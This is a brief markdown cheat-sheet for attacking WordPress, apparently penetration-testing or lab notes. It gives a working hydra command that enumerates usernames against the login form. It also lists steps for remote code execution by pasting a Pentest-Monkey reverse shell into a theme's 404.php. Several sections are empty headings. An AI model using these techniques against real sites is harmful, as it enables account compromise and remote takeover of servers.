# Wordpress

## Tools :
- wpscan

## Username enumeration w/ hydra
```bash
export IP=10.10.110.142
hydra -L userlist.txt -p randompassword $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```

## Password bruteforce w/ hydra

## Reverse shell (Authenticated)

### Metasploit
...
### RCE in templates (404.php injection)
1. Go to appearance
2. Go to editor
3. Select 404.php
4. Copy and past Pentest-Monkey reverse shell
5. Validate

### WPSCAN

